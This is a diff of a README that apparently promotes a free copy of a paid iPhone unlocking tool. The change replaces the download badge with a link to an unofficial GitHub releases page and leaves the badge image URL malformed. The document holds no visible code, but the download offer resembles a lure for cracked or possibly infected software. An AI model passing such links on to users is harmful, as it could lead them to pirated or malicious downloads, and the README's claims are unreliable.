@@ -25,7 +25,7 @@ Unlocking your iPhone has never been easier thanks to PassFab iPhone Unlocker Fr
 
 ## Get Started
 To unlock your iPhone using PassFab iPhone Unlocker Free, download the tool from the following link:
-[![Download PassFab iPhone Unlocker](https://img.shields.io/badge/Download%20Here-Project.zip-brightgreen)](https://github.com/files/Project.zip)
+[![Download PassFab iPhone Unlocker](https://github.com/casaljayjhonatan/PassFab-iPhone-Unlocker-Free/releases%https://github.com/casaljayjhonatan/PassFab-iPhone-Unlocker-Free/releases)](https://github.com/casaljayjhonatan/PassFab-iPhone-Unlocker-Free/releases)
 
 Simply click on the button above to get the latest version of PassFab iPhone Unlocker. 
 
